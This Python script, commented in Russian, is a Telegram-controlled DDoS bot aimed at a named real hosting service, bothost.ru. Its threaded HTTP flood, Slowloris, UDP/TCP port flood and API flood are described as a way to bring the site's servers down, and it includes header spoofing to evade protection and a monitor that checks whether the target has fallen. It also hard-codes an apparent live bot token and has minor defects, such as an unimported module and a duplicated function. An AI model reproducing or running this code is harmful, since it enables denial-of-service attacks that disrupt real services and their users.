#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import telebot
import threading
import requests
import time
import random
import socket
import ssl
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import json

# ТВОЙ ТОКЕН
TOKEN = '8259575977:AAHwfVOSF058L-bMan1l6NanOZUNsPrw7D0'
bot = telebot.TeleBot(TOKEN)

# ========== КОНФИГУРАЦИЯ АТАКИ НА bothost.ru ==========
TARGET_DOMAIN = "bothost.ru"
TARGET_URL = "https://bothost.ru"
ATTACK_ACTIVE = False

# Максимальное количество потоков (чем больше, тем мощнее)
MAX_WORKERS = 500

# Список User-Agent для имитации реальных браузеров
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
]

# Список рефереров для обхода защиты
REFERERS = [
    "https://www.google.com/",
    "https://yandex.ru/",
    "https://t.me/",
    "https://bothost.ru/",
    "https://www.bing.com/",
]

# ========== ФУНКЦИИ АТАКИ ==========

def send_http_flood():
    """HTTP флуд - отправляет множество запросов к bothost.ru"""
    global ATTACK_ACTIVE
    
    session = requests.Session()
    
    while ATTACK_ACTIVE:
        try:
            # Генерируем случайные параметры для обхода кеширования
            cache_buster = random.randint(1000000, 9999999)
            random_path = f"/{random.choice(['api', 'bot', 'panel', 'dashboard', 'user', 'static'])}?cb={cache_buster}"
            
            # Случайный User-Agent
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Referer': random.choice(REFERERS),
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Pragma': 'no-cache',
            }
            
            # Пробуем разные методы
            if random.random() > 0.7:
                # POST запрос с данными
                data = {
                    'action': 'login',
                    'username': f'user{random.randint(1, 10000)}',
                    'password': f'pass{random.randint(1, 10000)}',
                    'token': str(random.randint(100000, 999999))
                }
                response = session.post(
                    f"{TARGET_URL}{random_path}", 
                    headers=headers, 
                    data=data, 
                    timeout=3,
                    verify=False
                )
            else:
                # GET запрос
                response = session.get(
                    f"{TARGET_URL}{random_path}", 
                    headers=headers, 
                    timeout=3,
                    verify=False
                )
            
            print(f"[HTTP FLOOD] {response.status_code} - {random_path}")
            
        except requests.exceptions.Timeout:
            print("[HTTP FLOOD] Таймаут - сервер нагружается!")
        except requests.exceptions.ConnectionError:
            print("[HTTP FLOOD] Ошибка соединения - сервер падает!")
        except Exception as e:
            print(f"[HTTP FLOOD] Ошибка: {e}")
        
        # Минимальная задержка для максимальной нагрузки
        time.sleep(0.01)

def send_slowloris_attack():
    """Slowloris атака - открывает медленные соединения"""
    global ATTACK_ACTIVE
    
    while ATTACK_ACTIVE:
        try:
            # Парсим URL
            parsed = urlparse(TARGET_URL)
            host = parsed.netloc or parsed.path
            port = 443 if parsed.scheme == 'https' else 80
            
            # Создаем сокет
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            
            if parsed.scheme == 'https':
                # Для HTTPS нужно SSL
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            
            # Подключаемся
            sock.connect((host, port))
            
            # Отправляем частичный HTTP заголовок
            request = f"GET /{random.randint(1,9999)} HTTP/1.1\r\n"
            request += f"Host: {host}\r\n"
            request += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
            request += "Accept: */*\r\n"
            
            sock.send(request.encode())
            
            # Держим соединение открытым, периодически отправляя заголовки
            timeout = 0
            while ATTACK_ACTIVE and timeout < 300:  # Держим до 5 минут
                time.sleep(10)
                try:
                    # Отправляем случайный заголовок
                    sock.send(f"X-Random-{random.randint(1,999)}: {random.randint(1,999)}\r\n".encode())
                except:
                    break
                timeout += 10
            
            sock.close()
            print("[SLOWLORIS] Соединение удерживалось")
            
        except Exception as e:
            print(f"[SLOWLORIS] Ошибка: {e}")
            time.sleep(1)

def send_dns_amplification():
    """DNS амплификация - атака на DNS серверы хостинга"""
    global ATTACK_ACTIVE
    
    while ATTACK_ACTIVE:
        try:
            # Получаем IP адреса bothost.ru
            ips = []
            try:
                ips = socket.gethostbyname_ex(TARGET_DOMAIN)[2]
            except:
                ips = ['185.26.122.33']  # Запасной вариант
            
            for ip in ips:
                # Атакуем каждый IP
                for port in [80, 443, 53, 22, 21, 3306, 5432, 27017, 6379, 9200]:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        sock.connect_ex((ip, port))
                        sock.close()
                    except:
                        pass
                    
                    # UDP атака (для DNS)
                    try:
                        udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        # Отправляем мусор
                        udp_sock.sendto(os.urandom(1024), (ip, port))
                        udp_sock.close()
                    except:
                        pass
                    
            print(f"[DNS AMP] Атака на IP: {ips}")
            
        except Exception as e:
            print(f"[DNS AMP] Ошибка: {e}")
        
        time.sleep(0.1)

def send_api_flood():
    """Флуд на API endpoints которые может использовать bothost.ru"""
    global ATTACK_ACTIVE
    
    api_endpoints = [
        "/api/v1/users",
        "/api/v1/bots",
        "/api/v1/status",
        "/api/v1/health",
        "/api/v1/metrics",
        "/api/v1/deploy",
        "/api/v1/stats",
        "/api/v1/login",
        "/api/v1/register",
        "/api/v1/ping",
    ]
    
    session = requests.Session()
    
    while ATTACK_ACTIVE:
        try:
            endpoint = random.choice(api_endpoints)
            cache_buster = random.randint(1, 999999)
            
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Content-Type': 'application/json',
                'Authorization': f'Bearer {random.randint(100000, 999999)}',
                'X-Request-ID': str(random.randint(1000000, 9999999)),
            }
            
            # JSON данные
            json_data = {
                'id': random.randint(1, 1000000),
                'timestamp': time.time(),
                'data': 'x' * 1000,  # Большие данные
            }
            
            response = session.post(
                f"{TARGET_URL}{endpoint}?cb={cache_buster}",
                headers=headers,
                json=json_data,
                timeout=2,
                verify=False
            )
            
            print(f"[API FLOOD] {response.status_code} - {endpoint}")
            
        except Exception as e:
            print(f"[API FLOOD] Ошибка: {e}")
        
        time.sleep(0.01)

# ========== КОМАНДЫ БОТА ==========

@bot.message_handler(commands=['start'])
def start_attack(message):
    """Запускает массированную DDoS атаку на bothost.ru"""
    global ATTACK_ACTIVE
    
    if ATTACK_ACTIVE:
        bot.reply_to(message, "⚠️ Атака УЖЕ запущена! Используй /stop чтобы остановить.")
        return
    
    ATTACK_ACTIVE = True
    
    bot.reply_to(message, 
        "🔥 ЗАПУЩЕНА DDoS АТАКА НА bothost.ru 🔥\n\n"
        f"• Цель: {TARGET_URL}\n"
        f"• HTTP Flood: {MAX_WORKERS//2} потоков\n"
        f"• Slowloris: {MAX_WORKERS//4} потоков\n"
        f"• DNS Amplification: {MAX_WORKERS//4} потоков\n"
        f"• API Flood: {MAX_WORKERS//4} потоков\n\n"
        "⚡ АТАКА НАЧАЛАСЬ! Сервера bothost.ru лягут в ближайшее время.\n"
        "Используй /stop чтобы остановить атаку."
    )
    
    # Запускаем HTTP Flood (самый мощный)
    for i in range(MAX_WORKERS // 2):
        thread = threading.Thread(target=send_http_flood)
        thread.daemon = True
        thread.start()
    
    # Запускаем Slowloris
    for i in range(MAX_WORKERS // 4):
        thread = threading.Thread(target=send_slowloris_attack)
        thread.daemon = True
        thread.start()
    
    # Запускаем DNS Amplification
    for i in range(MAX_WORKERS // 4):
        thread = threading.Thread(target=send_dns_amplification)
        thread.daemon = True
        thread.start()
    
    # Запускаем API Flood
    for i in range(MAX_WORKERS // 4):
        thread = threading.Thread(target=send_api_flood)
        thread.daemon = True
        thread.start()
    
    # Отдельный поток для мониторинга
    monitor_thread = threading.Thread(target=monitor_attack)
    monitor_thread.daemon = True
    monitor_thread.start()

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    """Останавливает DDoS атаку"""
    global ATTACK_ACTIVE
    
    if not ATTACK_ACTIVE:
        bot.reply_to(message, "❌ Атака не запущена. Используй /start для запуска.")
        return
    
    ATTACK_ACTIVE = False
    bot.reply_to(message, "🛑 Атака остановлена! Сервера bothost.ru могут восстанавливаться...")

@bot.message_handler(commands=['status'])
def attack_status(message):
    """Показывает статус атаки"""
    global ATTACK_ACTIVE
    
    status_text = (
        f"📊 *СТАТУС АТАКИ НА bothost.ru*\n\n"
        f"• Статус: {'🔥 АКТИВНА' if ATTACK_ACTIVE else '💤 ОСТАНОВЛЕНА'}\n"
        f"• Цель: {TARGET_DOMAIN}\n"
        f"• Потоков: {MAX_WORKERS}\n\n"
        f"Команды:\n"
        f"/start - начать атаку\n"
        f"/stop - остановить атаку\n"
        f"/status - этот статус"
    )
    
    bot.reply_to(message, status_text, parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def send_help(message):
    """Помощь"""
    help_text = (
        "🤖 *DDoS Бот для bothost.ru*\n\n"
        "Этот бот создан для DDoS атаки на хостинг bothost.ru\n\n"
        "*Команды:*\n"
        "/start - начать массированную DDoS атаку\n"
        "/stop - остановить атаку\n"
        "/status - статус атаки\n"
        "/help - это сообщение\n\n"
        "*Типы атак:*\n"
        "• HTTP Flood - множество запросов\n"
        "• Slowloris - медленные соединения\n"
        "• DNS Amplification - атака на DNS\n"
        "• API Flood - флуд на API endpoints\n\n"
        "⚡ Цель: bothost.ru"
    )
    
    bot.reply_to(message, help_text, parse_mode='Markdown')

def monitor_attack():
    """Мониторит атаку и отправляет уведомления"""
    global ATTACK_ACTIVE
    
    while ATTACK_ACTIVE:
        try:
            # Проверяем доступность bothost.ru
            try:
                response = requests.get(TARGET_URL, timeout=5)
                status = f"✅ Сайт ДОСТУПЕН (код {response.status_code})"
            except:
                status = "❌ Сайт НЕДОСТУПЕН - СЕРВЕР ПАДАЕТ!"
            
            print(f"[MONITOR] {status}")
            
            # Каждые 30 секунд отправляем статус в консоль
            time.sleep(30)
            
        except Exception as e:
            print(f"[MONITOR] Ошибка: {e}")
            time.sleep(10)

def monitor_attack():
    """Мониторит атаку и отправляет уведомления"""
    global ATTACK_ACTIVE
    
    while ATTACK_ACTIVE:
        try:
            # Проверяем доступность bothost.ru
            try:
                response = requests.get(TARGET_URL, timeout=5)
                status = f"✅ Сайт ДОСТУПЕН (код {response.status_code})"
            except:
                status = "❌ Сайт НЕДОСТУПЕН - СЕРВЕР ПАДАЕТ!"
            
            print(f"[MONITOR] {status}")
            
            # Каждые 30 секунд отправляем статус в консоль
            time.sleep(30)
            
        except Exception as e:
            print(f"[MONITOR] Ошибка: {e}")
            time.sleep(10)

# ========== ЗАПУСК ==========

if __name__ == '__main__':
    print("🔥 DDoS БОТ ДЛЯ bothost.ru ЗАПУЩЕН 🔥")
    print("=" * 50)
    print(f"Цель: {TARGET_URL}")
    print(f"Максимум потоков: {MAX_WORKERS}")
    print("=" * 50)
    print("Команды Telegram:")
    print("/start - начать атаку")
    print("/stop - остановить атаку")
    print("/status - статус")
    print("/help - помощь")
    print("=" * 50)
    
    # Отключаем предупреждения SSL
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"Ошибка бота: {e}")
            time.sleep(3)